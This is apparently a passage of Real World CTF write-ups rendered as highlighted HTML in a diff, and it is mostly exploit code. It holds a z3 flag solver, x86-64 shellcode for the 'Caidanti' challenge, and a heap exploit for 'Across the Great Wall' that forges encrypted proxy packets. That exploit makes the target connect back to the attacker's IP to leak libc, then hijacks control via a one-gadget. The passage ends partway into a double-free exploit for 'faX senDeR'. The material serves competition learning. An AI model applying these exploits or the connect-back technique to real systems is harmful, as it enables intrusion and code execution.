+[<span class="hljs-number">82</span>, <span class="hljs-number">92</span>, <span class="hljs-number">158</span>, <span class="hljs-number">245</span>, <span class="hljs-number">143</span>, <span class="hljs-number">181</span>, <span class="hljs-number">89</span>, <span class="hljs-number">151</span>, <span class="hljs-number">55</span>, <span class="hljs-number">181</span>, <span class="hljs-number">89</span>, <span class="hljs-number">29</span>, <span class="hljs-number">1</span>, <span class="hljs-number">79</span>, <span class="hljs-number">76</span>, <span class="hljs-number">36</span>, <span class="hljs-number">25</span>, <span class="hljs-number">194</span>, <span class="hljs-number">19</span>, <span class="hljs-number">222</span>, <span class="hljs-number">98</span>, <span class="hljs-number">134</span>, <span class="hljs-number">121</span>, <span class="hljs-number">149</span>, <span class="hljs-number">82</span>, <span class="hljs-number">15</span>, <span class="hljs-number">61</span>, <span class="hljs-number">135</span>, <span class="hljs-number">251</span>, <span class="hljs-number">153</span>, <span class="hljs-number">37</span>, <span class="hljs-number">174</span>, <span class="hljs-number">205</span>, <span class="hljs-number">2</span>, <span class="hljs-number">46</span>],
+[<span class="hljs-number">134</span>, <span class="hljs-number">166</span>, <span class="hljs-number">249</span>, <span class="hljs-number">122</span>, <span class="hljs-number">91</span>, <span class="hljs-number">80</span>, <span class="hljs-number">36</span>, <span class="hljs-number">245</span>, <span class="hljs-number">154</span>, <span class="hljs-number">140</span>, <span class="hljs-number">245</span>, <span class="hljs-number">134</span>, <span class="hljs-number">254</span>, <span class="hljs-number">50</span>, <span class="hljs-number">42</span>, <span class="hljs-number">42</span>, <span class="hljs-number">46</span>, <span class="hljs-number">13</span>, <span class="hljs-number">216</span>, <span class="hljs-number">131</span>, <span class="hljs-number">25</span>, <span class="hljs-number">182</span>, <span class="hljs-number">16</span>, <span class="hljs-number">163</span>, <span class="hljs-number">32</span>, <span class="hljs-number">30</span>, <span class="hljs-number">18</span>, <span class="hljs-number">41</span>, <span class="hljs-number">108</span>, <span class="hljs-number">170</span>, <span class="hljs-number">60</span>, <span class="hljs-number">4</span>, <span class="hljs-number">45</span>, <span class="hljs-number">109</span>, <span class="hljs-number">242</span>],
+[<span class="hljs-number">141</span>, <span class="hljs-number">25</span>, <span class="hljs-number">7</span>, <span class="hljs-number">101</span>, <span class="hljs-number">230</span>, <span class="hljs-number">134</span>, <span class="hljs-number">153</span>, <span class="hljs-number">244</span>, <span class="hljs-number">113</span>, <span class="hljs-number">228</span>, <span class="hljs-number">128</span>, <span class="hljs-number">151</span>, <span class="hljs-number">226</span>, <span class="hljs-number">49</span>, <span class="hljs-number">50</span>, <span class="hljs-number">21</span>, <span class="hljs-number">71</span>, <span class="hljs-number">190</span>, <span class="hljs-number">5</span>, <span class="hljs-number">139</span>, <span class="hljs-number">178</span>, <span class="hljs-number">220</span>, <span class="hljs-number">84</span>, <span class="hljs-number">125</span>, <span class="hljs-number">77</span>, <span class="hljs-number">243</span>, <span class="hljs-number">106</span>, <span class="hljs-number">13</span>, <span class="hljs-number">3</span>, <span class="hljs-number">8</span>, <span class="hljs-number">214</span>, <span class="hljs-number">211</span>, <span class="hljs-number">107</span>, <span class="hljs-number">98</span>, <span class="hljs-number">120</span>],
+[<span class="hljs-number">203</span>, <span class="hljs-number">208</span>, <span class="hljs-number">10</span>, <span class="hljs-number">211</span>, <span class="hljs-number">211</span>, <span class="hljs-number">55</span>, <span class="hljs-number">3</span>, <span class="hljs-number">30</span>, <span class="hljs-number">246</span>, <span class="hljs-number">160</span>, <span class="hljs-number">27</span>, <span class="hljs-number">125</span>, <span class="hljs-number">196</span>, <span class="hljs-number">95</span>, <span class="hljs-number">157</span>, <span class="hljs-number">70</span>, <span class="hljs-number">111</span>, <span class="hljs-number">109</span>, <span class="hljs-number">0</span>, <span class="hljs-number">253</span>, <span class="hljs-number">226</span>, <span class="hljs-number">240</span>, <span class="hljs-number">131</span>, <span class="hljs-number">9</span>, <span class="hljs-number">139</span>, <span class="hljs-number">201</span>, <span class="hljs-number">227</span>, <span class="hljs-number">206</span>, <span class="hljs-number">221</span>, <span class="hljs-number">15</span>, <span class="hljs-number">68</span>, <span class="hljs-number">185</span>, <span class="hljs-number">201</span>, <span class="hljs-number">170</span>, <span class="hljs-number">5</span>],
+[<span class="hljs-number">196</span>, <span class="hljs-number">90</span>, <span class="hljs-number">0</span>, <span class="hljs-number">104</span>, <span class="hljs-number">20</span>, <span class="hljs-number">150</span>, <span class="hljs-number">218</span>, <span class="hljs-number">220</span>, <span class="hljs-number">95</span>, <span class="hljs-number">218</span>, <span class="hljs-number">239</span>, <span class="hljs-number">29</span>, <span class="hljs-number">125</span>, <span class="hljs-number">177</span>, <span class="hljs-number">167</span>, <span class="hljs-number">13</span>, <span class="hljs-number">93</span>, <span class="hljs-number">73</span>, <span class="hljs-number">20</span>, <span class="hljs-number">34</span>, <span class="hljs-number">8</span>, <span class="hljs-number">106</span>, <span class="hljs-number">231</span>, <span class="hljs-number">12</span>, <span class="hljs-number">121</span>, <span class="hljs-number">88</span>, <span class="hljs-number">12</span>, <span class="hljs-number">186</span>, <span class="hljs-number">45</span>, <span class="hljs-number">240</span>, <span class="hljs-number">232</span>, <span class="hljs-number">193</span>, <span class="hljs-number">22</span>, <span class="hljs-number">240</span>, <span class="hljs-number">73</span>],
+[<span class="hljs-number">170</span>, <span class="hljs-number">145</span>, <span class="hljs-number">187</span>, <span class="hljs-number">181</span>, <span class="hljs-number">53</span>, <span class="hljs-number">42</span>, <span class="hljs-number">90</span>, <span class="hljs-number">152</span>, <span class="hljs-number">23</span>, <span class="hljs-number">128</span>, <span class="hljs-number">6</span>, <span class="hljs-number">253</span>, <span class="hljs-number">166</span>, <span class="hljs-number">115</span>, <span class="hljs-number">220</span>, <span class="hljs-number">243</span>, <span class="hljs-number">173</span>, <span class="hljs-number">103</span>, <span class="hljs-number">112</span>, <span class="hljs-number">177</span>, <span class="hljs-number">62</span>, <span class="hljs-number">98</span>, <span class="hljs-number">157</span>, <span class="hljs-number">140</span>, <span class="hljs-number">149</span>, <span class="hljs-number">88</span>, <span class="hljs-number">7</span>, <span class="hljs-number">141</span>, <span class="hljs-number">129</span>, <span class="hljs-number">74</span>, <span class="hljs-number">2</span>, <span class="hljs-number">237</span>, <span class="hljs-number">144</span>, <span class="hljs-number">63</span>, <span class="hljs-number">214</span>],
+[<span class="hljs-number">52</span>, <span class="hljs-number">21</span>, <span class="hljs-number">108</span>, <span class="hljs-number">12</span>, <span class="hljs-number">34</span>, <span class="hljs-number">120</span>, <span class="hljs-number">150</span>, <span class="hljs-number">82</span>, <span class="hljs-number">43</span>, <span class="hljs-number">149</span>, <span class="hljs-number">43</span>, <span class="hljs-number">3</span>, <span class="hljs-number">103</span>, <span class="hljs-number">84</span>, <span class="hljs-number">49</span>, <span class="hljs-number">17</span>, <span class="hljs-number">4</span>, <span class="hljs-number">90</span>, <span class="hljs-number">73</span>, <span class="hljs-number">165</span>, <span class="hljs-number">124</span>, <span class="hljs-number">144</span>, <span class="hljs-number">246</span>, <span class="hljs-number">214</span>, <span class="hljs-number">11</span>, <span class="hljs-number">111</span>, <span class="hljs-number">177</span>, <span class="hljs-number">109</span>, <span class="hljs-number">89</span>, <span class="hljs-number">107</span>, <span class="hljs-number">25</span>, <span class="hljs-number">244</span>, <span class="hljs-number">250</span>, <span class="hljs-number">50</span>, <span class="hljs-number">10</span>],
+[<span class="hljs-number">93</span>, <span class="hljs-number">181</span>, <span class="hljs-number">112</span>, <span class="hljs-number">62</span>, <span class="hljs-number">205</span>, <span class="hljs-number">177</span>, <span class="hljs-number">134</span>, <span class="hljs-number">35</span>, <span class="hljs-number">42</span>, <span class="hljs-number">210</span>, <span class="hljs-number">15</span>, <span class="hljs-number">115</span>, <span class="hljs-number">150</span>, <span class="hljs-number">168</span>, <span class="hljs-number">135</span>, <span class="hljs-number">249</span>, <span class="hljs-number">220</span>, <span class="hljs-number">151</span>, <span class="hljs-number">122</span>, <span class="hljs-number">182</span>, <span class="hljs-number">22</span>, <span class="hljs-number">155</span>, <span class="hljs-number">45</span>, <span class="hljs-number">161</span>, <span class="hljs-number">171</span>, <span class="hljs-number">40</span>, <span class="hljs-number">49</span>, <span class="hljs-number">68</span>, <span class="hljs-number">242</span>, <span class="hljs-number">208</span>, <span class="hljs-number">4</span>, <span class="hljs-number">57</span>, <span class="hljs-number">231</span>, <span class="hljs-number">15</span>, <span class="hljs-number">132</span>],
+[<span class="hljs-number">46</span>, <span class="hljs-number">128</span>, <span class="hljs-number">62</span>, <span class="hljs-number">177</span>, <span class="hljs-number">99</span>, <span class="hljs-number">165</span>, <span class="hljs-number">101</span>, <span class="hljs-number">98</span>, <span class="hljs-number">54</span>, <span class="hljs-number">164</span>, <span class="hljs-number">6</span>, <span class="hljs-number">214</span>, <span class="hljs-number">7</span>, <span class="hljs-number">238</span>, <span class="hljs-number">34</span>, <span class="hljs-number">221</span>, <span class="hljs-number">126</span>, <span class="hljs-number">213</span>, <span class="hljs-number">127</span>, <span class="hljs-number">117</span>, <span class="hljs-number">199</span>, <span class="hljs-number">145</span>, <span class="hljs-number">191</span>, <span class="hljs-number">163</span>, <span class="hljs-number">38</span>, <span class="hljs-number">53</span>, <span class="hljs-number">73</span>, <span class="hljs-number">175</span>, <span class="hljs-number">33</span>, <span class="hljs-number">10</span>, <span class="hljs-number">150</span>, <span class="hljs-number">103</span>, <span class="hljs-number">187</span>, <span class="hljs-number">30</span>, <span class="hljs-number">29</span>],
+[<span class="hljs-number">233</span>, <span class="hljs-number">171</span>, <span class="hljs-number">199</span>, <span class="hljs-number">167</span>, <span class="hljs-number">54</span>, <span class="hljs-number">196</span>, <span class="hljs-number">53</span>, <span class="hljs-number">109</span>, <span class="hljs-number">87</span>, <span class="hljs-number">250</span>, <span class="hljs-number">23</span>, <span class="hljs-number">118</span>, <span class="hljs-number">225</span>, <span class="hljs-number">180</span>, <span class="hljs-number">48</span>, <span class="hljs-number">49</span>, <span class="hljs-number">87</span>, <span class="hljs-number">91</span>, <span class="hljs-number">53</span>, <span class="hljs-number">74</span>, <span class="hljs-number">177</span>, <span class="hljs-number">178</span>, <span class="hljs-number">223</span>, <span class="hljs-number">78</span>, <span class="hljs-number">144</span>, <span class="hljs-number">154</span>, <span class="hljs-number">38</span>, <span class="hljs-number">137</span>, <span class="hljs-number">148</span>, <span class="hljs-number">12</span>, <span class="hljs-number">218</span>, <span class="hljs-number">158</span>, <span class="hljs-number">231</span>, <span class="hljs-number">6</span>, <span class="hljs-number">249</span>],
+[<span class="hljs-number">19</span>, <span class="hljs-number">171</span>, <span class="hljs-number">235</span>, <span class="hljs-number">39</span>, <span class="hljs-number">42</span>, <span class="hljs-number">71</span>, <span class="hljs-number">170</span>, <span class="hljs-number">93</span>, <span class="hljs-number">240</span>, <span class="hljs-number">22</span>, <span class="hljs-number">201</span>, <span class="hljs-number">22</span>, <span class="hljs-number">144</span>, <span class="hljs-number">171</span>, <span class="hljs-number">47</span>, <span class="hljs-number">221</span>, <span class="hljs-number">4</span>, <span class="hljs-number">50</span>, <span class="hljs-number">114</span>, <span class="hljs-number">140</span>, <span class="hljs-number">38</span>, <span class="hljs-number">26</span>, <span class="hljs-number">15</span>, <span class="hljs-number">35</span>, <span class="hljs-number">207</span>, <span class="hljs-number">214</span>, <span class="hljs-number">223</span>, <span class="hljs-number">93</span>, <span class="hljs-number">116</span>, <span class="hljs-number">122</span>, <span class="hljs-number">55</span>, <span class="hljs-number">133</span>, <span class="hljs-number">183</span>, <span class="hljs-number">196</span>, <span class="hljs-number">251</span>],
+[<span class="hljs-number">168</span>, <span class="hljs-number">3</span>, <span class="hljs-number">16</span>, <span class="hljs-number">234</span>, <span class="hljs-number">188</span>, <span class="hljs-number">196</span>, <span class="hljs-number">5</span>, <span class="hljs-number">207</span>, <span class="hljs-number">227</span>, <span class="hljs-number">40</span>, <span class="hljs-number">178</span>, <span class="hljs-number">108</span>, <span class="hljs-number">10</span>, <span class="hljs-number">92</span>, <span class="hljs-number">2</span>, <span class="hljs-number">44</span>, <span class="hljs-number">87</span>, <span class="hljs-number">100</span>, <span class="hljs-number">68</span>, <span class="hljs-number">217</span>, <span class="hljs-number">254</span>, <span class="hljs-number">242</span>, <span class="hljs-number">123</span>, <span class="hljs-number">75</span>, <span class="hljs-number">20</span>, <span class="hljs-number">152</span>, <span class="hljs-number">195</span>, <span class="hljs-number">107</span>, <span class="hljs-number">100</span>, <span class="hljs-number">153</span>, <span class="hljs-number">126</span>, <span class="hljs-number">79</span>, <span class="hljs-number">55</span>, <span class="hljs-number">112</span>, <span class="hljs-number">203</span>],
+[<span class="hljs-number">167</span>, <span class="hljs-number">31</span>, <span class="hljs-number">235</span>, <span class="hljs-number">248</span>, <span class="hljs-number">49</span>, <span class="hljs-number">203</span>, <span class="hljs-number">136</span>, <span class="hljs-number">140</span>, <span class="hljs-number">18</span>, <span class="hljs-number">100</span>, <span class="hljs-number">178</span>, <span class="hljs-number">16</span>, <span class="hljs-number">65</span>, <span class="hljs-number">100</span>, <span class="hljs-number">111</span>, <span class="hljs-number">82</span>, <span class="hljs-number">10</span>, <span class="hljs-number">79</span>, <span class="hljs-number">200</span>, <span class="hljs-number">34</span>, <span class="hljs-number">233</span>, <span class="hljs-number">198</span>, <span class="hljs-number">75</span>, <span class="hljs-number">235</span>, <span class="hljs-number">249</span>, <span class="hljs-number">23</span>, <span class="hljs-number">112</span>, <span class="hljs-number">13</span>, <span class="hljs-number">232</span>, <span class="hljs-number">65</span>, <span class="hljs-number">179</span>, <span class="hljs-number">150</span>, <span class="hljs-number">151</span>, <span class="hljs-number">129</span>, <span class="hljs-number">198</span>],
+[<span class="hljs-number">235</span>, <span class="hljs-number">191</span>, <span class="hljs-number">54</span>, <span class="hljs-number">191</span>, <span class="hljs-number">200</span>, <span class="hljs-number">54</span>, <span class="hljs-number">72</span>, <span class="hljs-number">238</span>, <span class="hljs-number">217</span>, <span class="hljs-number">252</span>, <span class="hljs-number">67</span>, <span class="hljs-number">104</span>, <span class="hljs-number">202</span>, <span class="hljs-number">104</span>, <span class="hljs-number">54</span>, <span class="hljs-number">245</span>, <span class="hljs-number">134</span>, <span class="hljs-number">80</span>, <span class="hljs-number">242</span>, <span class="hljs-number">45</span>, <span class="hljs-number">106</span>, <span class="hljs-number">164</span>, <span class="hljs-number">239</span>, <span class="hljs-number">51</span>, <span class="hljs-number">91</span>, <span class="hljs-number">103</span>, <span class="hljs-number">239</span>, <span class="hljs-number">213</span>, <span class="hljs-number">55</span>, <span class="hljs-number">3</span>, <span class="hljs-number">61</span>, <span class="hljs-number">251</span>, <span class="hljs-number">148</span>, <span class="hljs-number">122</span>, <span class="hljs-number">131</span>],
+ [<span class="hljs-number">2</span>, <span class="hljs-number">64</span>, <span class="hljs-number">207</span>, <span class="hljs-number">18</span>, <span class="hljs-number">11</span>, <span class="hljs-number">5</span>, <span class="hljs-number">254</span>, <span class="hljs-number">31</span>, <span class="hljs-number">90</span>, <span class="hljs-number">127</span>, <span class="hljs-number">143</span>, <span class="hljs-number">25</span>, <span class="hljs-number">118</span>, <span class="hljs-number">140</span>, <span class="hljs-number">64</span>, <span class="hljs-number">212</span>, <span class="hljs-number">242</span>, <span class="hljs-number">184</span>, <span class="hljs-number">185</span>, <span class="hljs-number">171</span>, <span class="hljs-number">201</span>, <span class="hljs-number">91</span>, <span class="hljs-number">80</span>, <span class="hljs-number">174</span>, <span class="hljs-number">27</span>, <span class="hljs-number">38</span>, <span class="hljs-number">179</span>, <span class="hljs-number">254</span>, <span class="hljs-number">197</span>, <span class="hljs-number">119</span>, <span class="hljs-number">83</span>, <span class="hljs-number">215</span>, <span class="hljs-number">54</span>, <span class="hljs-number">194</span>, <span class="hljs-number">244</span>],
+[<span class="hljs-number">41</span>, <span class="hljs-number">92</span>, <span class="hljs-number">39</span>, <span class="hljs-number">141</span>, <span class="hljs-number">109</span>, <span class="hljs-number">113</span>, <span class="hljs-number">31</span>, <span class="hljs-number">175</span>, <span class="hljs-number">74</span>, <span class="hljs-number">120</span>, <span class="hljs-number">148</span>, <span class="hljs-number">28</span>, <span class="hljs-number">236</span>, <span class="hljs-number">38</span>, <span class="hljs-number">45</span>, <span class="hljs-number">141</span>, <span class="hljs-number">15</span>, <span class="hljs-number">84</span>, <span class="hljs-number">132</span>, <span class="hljs-number">206</span>, <span class="hljs-number">215</span>, <span class="hljs-number">165</span>, <span class="hljs-number">4</span>, <span class="hljs-number">169</span>, <span class="hljs-number">255</span>, <span class="hljs-number">133</span>, <span class="hljs-number">107</span>, <span class="hljs-number">3</span>, <span class="hljs-number">180</span>, <span class="hljs-number">234</span>, <span class="hljs-number">125</span>, <span class="hljs-number">168</span>, <span class="hljs-number">104</span>, <span class="hljs-number">143</span>, <span class="hljs-number">88</span>]]
+
+
+flag=[]
+s=<span class="hljs-symbol">Solver</span>()
+for i in range(<span class="hljs-number">35</span>):
+  flag.append(<span class="hljs-symbol">Int</span>(<span class="hljs-string">"flag"</span>+str(i)))
+
+ans=[<span class="hljs-number">426252</span>, <span class="hljs-number">446789</span>, <span class="hljs-number">512410</span>, <span class="hljs-number">460475</span>, <span class="hljs-number">398015</span>, <span class="hljs-number">458748</span>, <span class="hljs-number">415766</span>, <span class="hljs-number">414056</span>, <span class="hljs-number">458307</span>, <span class="hljs-number">396230</span>, <span class="hljs-number">384387</span>, <span class="hljs-number">439563</span>, <span class="hljs-number">443097</span>, <span class="hljs-number">429073</span>, <span class="hljs-number">403305</span>, <span class="hljs-number">417219</span>, <span class="hljs-number">444707</span>, <span class="hljs-number">336685</span>, <span class="hljs-number">442240</span>, <span class="hljs-number">378401</span>, <span class="hljs-number">367024</span>, <span class="hljs-number">377385</span>,
+<span class="hljs-number">431611</span>,
+<span class="hljs-number">401614</span>,
+<span class="hljs-number">417547</span>,
+<span class="hljs-number">300004</span>,
+<span class="hljs-number">438293</span>,
+<span class="hljs-number">374362</span>,
+<span class="hljs-number">440701</span>,
+<span class="hljs-number">398171</span>,
+<span class="hljs-number">393955</span>,
+<span class="hljs-number">447599</span>,
+<span class="hljs-number">461277</span>,
+<span class="hljs-number">431759</span>,
+<span class="hljs-number">388457</span>]
+
+print len(mat[<span class="hljs-number">0</span>])
+
+
+for i in range(<span class="hljs-number">35</span>):
+  temp=<span class="hljs-number">0</span>
+  for j in range(<span class="hljs-number">35</span>):
+    temp+=flag[j]*mat[i][j]
+  s.add(temp==ans[i])
+
+print s.check()
+print s.model()
+
+ff=<span class="hljs-string">""</span>
+for i in flag:
+  ff+=chr(int(str(s.model()[i])))
+print ff
+</code></pre><h3 id="caidanti"><a class="header-link" href="#caidanti"></a>Caidanti</h3>
+<pre class="hljs"><code>from pwn import *
+context.arch=<span class="hljs-string">"amd64"</span>
+r=remote(<span class="hljs-string">"fe80::5054:ff:fe63:5e7a%qemu"</span>, <span class="hljs-number">31337</span>)
+#r=remote(<span class="hljs-string">"54.177.17.135"</span>, <span class="hljs-number">23333</span>)
+
+payload=<span class="hljs-string">'''</span>
+<span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>,<span class="hljs-number">0xdead</span>
+<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r8</span>,<span class="hljs-built_in">r12</span> # use <span class="hljs-built_in">r12</span> leak code text base address
+<span class="hljs-keyword">sub</span> <span class="hljs-built_in">r8</span>,<span class="hljs-number">0x33a3</span> # now <span class="hljs-built_in">r8</span> is  code text base
+<span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>,<span class="hljs-built_in">r8</span>
+<span class="hljs-keyword">add</span> <span class="hljs-built_in">rdi</span>,<span class="hljs-number">0x3B56</span>
+<span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>,<span class="hljs-built_in">r8</span>
+<span class="hljs-keyword">add</span> <span class="hljs-built_in">rax</span>,<span class="hljs-number">0x10D00</span>
+<span class="hljs-keyword">call</span> <span class="hljs-built_in">rax</span>  # Just a put <span class="hljs-keyword">test</span>
+<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r8</span>,<span class="hljs-built_in">r12</span>
+<span class="hljs-keyword">sub</span> <span class="hljs-built_in">r8</span>,<span class="hljs-number">0x33a3</span>
+<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r13</span>,<span class="hljs-built_in">r8</span>
+<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r9</span>,<span class="hljs-built_in">r8</span>
+<span class="hljs-keyword">add</span> <span class="hljs-built_in">r9</span>,<span class="hljs-number">0x12140</span>
+<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r12</span>,<span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">r9</span>]
+<span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>,<span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">r12</span>]
+<span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>,<span class="hljs-built_in">r12</span>
+
+<span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>,<span class="hljs-built_in">rsp</span>
+<span class="hljs-keyword">add</span> <span class="hljs-built_in">rsi</span>,<span class="hljs-number">0x50</span>
+<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r15</span>,<span class="hljs-number">0x416564614d756f59</span>
+<span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rsi</span>],<span class="hljs-built_in">r15</span>
+<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r15</span>,<span class="hljs-number">0x6c6c61434c444946</span>
+<span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rsi</span>+<span class="hljs-number">8</span>],<span class="hljs-built_in">r15</span>
+<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r15</span>,<span class="hljs-number">0x0</span>
+<span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rsi</span>+<span class="hljs-number">16</span>],<span class="hljs-built_in">r15</span>
+<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r15</span>,<span class="hljs-number">16</span>
+<span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rsi</span>+<span class="hljs-number">23</span>],<span class="hljs-built_in">r15</span>
+<span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>,<span class="hljs-built_in">rsp</span>
+<span class="hljs-keyword">add</span> <span class="hljs-built_in">rdx</span>,<span class="hljs-number">0x20</span>
+<span class="hljs-keyword">mov</span> <span class="hljs-built_in">rcx</span>,<span class="hljs-built_in">rsp</span>
+
+<span class="hljs-keyword">add</span> <span class="hljs-built_in">rcx</span>,<span class="hljs-number">0x40</span>              # <span class="hljs-built_in">rdi</span> = ? <span class="hljs-built_in">rsi</span> = password to getflag <span class="hljs-built_in">rdx</span> = return buf
+<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r14</span>,<span class="hljs-built_in">rdi</span>
+<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r15</span>,<span class="hljs-built_in">rdx</span>               
+<span class="hljs-keyword">call</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rax</span>+<span class="hljs-number">0x38</span>] # send get flag request 
+<span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsp</span>,<span class="hljs-built_in">r15</span>
+<span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>,[<span class="hljs-built_in">rsp</span>]
+<span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>,<span class="hljs-built_in">r13</span>
+<span class="hljs-keyword">add</span> <span class="hljs-built_in">rax</span>,<span class="hljs-number">0x10D00</span>
+<span class="hljs-keyword">call</span> <span class="hljs-built_in">rax</span> # put(flag)
+<span class="hljs-string">'''</span>
+
+
+pp=asm(payload)
+print r.recvuntil(<span class="hljs-string">"114514"</span>)
+r.sendline(<span class="hljs-string">"114514"</span>)
+r.recvuntil(<span class="hljs-string">"Your code size:"</span>)
+r.sendline(<span class="hljs-keyword">str</span>(len(pp)))
+r.send(pp)
+
+r.interactive()
+</code></pre><h2 id="pwn"><a class="header-link" href="#pwn"></a>Pwn</h2>
+<h3 id="across-the-great-wall"><a class="header-link" href="#across-the-great-wall"></a>Across the Great Wall</h3>
+<pre class="hljs"><code><span class="hljs-built_in">import</span> hashlib
+from Crypto.Cipher <span class="hljs-built_in">import</span> AES
+<span class="hljs-built_in">import</span> sys
+from pwn <span class="hljs-built_in">import</span> *
+<span class="hljs-built_in">import</span> os
+<span class="hljs-built_in">import</span> socket
+<span class="hljs-attr">host</span> = <span class="hljs-string">"54.153.22.136"</span> 
+<span class="hljs-comment">#host = "localhost"</span>
+
+<span class="hljs-comment">#s = process('../../shadow_server')</span>
+<span class="hljs-attr">s</span> = remote(<span class="hljs-string">"54.153.22.136"</span>,<span class="hljs-number">3343</span>)
+s.recvuntil(<span class="hljs-string">"at "</span>)
+<span class="hljs-attr">port</span> = int(s.recvline())
+print <span class="hljs-string">"localhost"</span>,port
+<span class="hljs-attr">r</span> = remote(host,port)
+
+def gen_payload(size,<span class="hljs-attr">data=""):</span>
+    <span class="hljs-attr">timestamp</span> = time.time()
+    <span class="hljs-attr">noise</span> = os.urandom(<span class="hljs-number">8</span>)
+    <span class="hljs-attr">m</span> = hashlib.sha256()
+    m.update(<span class="hljs-string">"meiyoumima"</span>)
+    m.update(p64(timestamp))
+    m.update(noise)
+    <span class="hljs-attr">token</span> = m.digest()[:<span class="hljs-number">16</span>]
+    <span class="hljs-attr">payload</span> = token
+    <span class="hljs-attr">m</span> = hashlib.sha256()
+    m.update(<span class="hljs-string">"meiyoumima"</span>)
+    m.update(token)
+    <span class="hljs-attr">secret</span> = m.digest()
+    <span class="hljs-attr">aes</span> = AES.new(secret[:<span class="hljs-number">16</span>], AES.MODE_CBC,secret[<span class="hljs-number">16</span>:<span class="hljs-number">32</span>])
+    payload += aes.encrypt(p64(timestamp)+noise)
+    <span class="hljs-attr">m</span> = hashlib.sha256()
+    m.update(token+p64(timestamp)+noise+p8(<span class="hljs-number">1</span>)+p32(size)+p8(<span class="hljs-number">0</span>)+<span class="hljs-string">"a"</span>*<span class="hljs-number">10</span>+<span class="hljs-string">"\x00"</span>*<span class="hljs-number">0</span>x20+data)
+    <span class="hljs-attr">hash_sum</span> = m.digest()
+    payload += aes.encrypt(p8(<span class="hljs-number">1</span>)+p32(size)+p8(<span class="hljs-number">0</span>)+<span class="hljs-string">"a"</span>*<span class="hljs-number">10</span>+hash_sum+data)
+    return payload
+
+<span class="hljs-attr">payload</span> = gen_payload(<span class="hljs-number">79</span>)
+r.send(payload)
+
+<span class="hljs-attr">IP</span> = <span class="hljs-comment"># local public IP</span>
+
+<span class="hljs-attr">payload</span> = gen_payload(<span class="hljs-number">96</span>,<span class="hljs-string">"\x01\x01\x01"</span>+
+        socket.inet_aton(IP)+
+        p16(<span class="hljs-number">4444</span>)[::-<span class="hljs-number">1</span>]+
+        <span class="hljs-string">"\x80"</span>*<span class="hljs-number">7</span>)
+<span class="hljs-attr">ss</span> = remote(host,port)
+ss.send(payload)
+
+<span class="hljs-attr">l</span> = listen(<span class="hljs-number">4444</span>)
+<span class="hljs-attr">_</span> = l.wait_for_connection()
+<span class="hljs-attr">data</span> = l.recvn(<span class="hljs-number">0</span>x60)
+<span class="hljs-attr">idx</span> = data.find(<span class="hljs-string">"\x7f"</span>)
+<span class="hljs-attr">libc</span> = u64(data[idx-<span class="hljs-number">5</span>:idx+<span class="hljs-number">3</span>])-<span class="hljs-number">0</span>x108fbd0
+print hex(libc)
+<span class="hljs-comment">#libc = int(raw_input(":"),16)</span>
+r.send(<span class="hljs-string">"a"</span>*<span class="hljs-number">0</span>x28+p64(<span class="hljs-number">0</span>x4)+<span class="hljs-string">"a"</span>*<span class="hljs-number">0</span>x448+p64(<span class="hljs-number">0</span>x201)+p64(libc+<span class="hljs-number">0</span>x3ed8e8))
+
+<span class="hljs-attr">rr</span> = remote(host,port)
+<span class="hljs-attr">payload</span> = gen_payload(<span class="hljs-number">0</span>x220+<span class="hljs-number">80</span>-<span class="hljs-number">1</span>)
+rr.send(payload)
+
+<span class="hljs-attr">rrr</span> = remote(host,port)
+<span class="hljs-attr">payload</span> = gen_payload(<span class="hljs-number">0</span>x220+<span class="hljs-number">80</span>-<span class="hljs-number">1</span>)
+rrr.send(payload)
+rrr.send(p64(libc+<span class="hljs-number">0</span>xe5858))
+
+s.interactive()
+
+
+</code></pre><h3 id="fax-sender"><a class="header-link" href="#fax-sender"></a>faX senDeR</h3>
+<ul class="list">
+<li>delete_msg didn&#39;t clean the pointer.</li>
+<li>add_msg with an invalid size, it won&#39;t set the new pinter, old pointer remained.</li>
+<li>double free
+<code>`</code>python=
+#!/usr/bin/env python
+from pwn import *</li>
+</ul>
+<h1 id="rwctf{digging_into_libxdr}"><a class="header-link" href="#rwctf{digging_into_libxdr}"></a>rwctf{Digging_Into_libxdr}</h1>
+<p>context.arch = &#39;amd64&#39;
+y = remote( &#39;tcp.realworldctf.com&#39; , 10917 )</p>
+<p>def add_con( len , name , l2 , ip ):
+    p = p32( 1 , endian = &#39;big&#39; )
+    p += p32( 1 , endian = &#39;big&#39; )
+    p += p32( len , endian = &#39;big&#39; ) + name.ljust( len , &#39;\0&#39; )
+    p += p32( l2 , endian = &#39;big&#39; )
+    p += ip
+    y.send( p.ljust( 0x100 , &#39;\0&#39; ) )
+    r = y.recv( 0x1000 )
+    print r[:0x20]</p>
+<p>def list_con():
+    p = p32( 2 , endian = &#39;big&#39; )
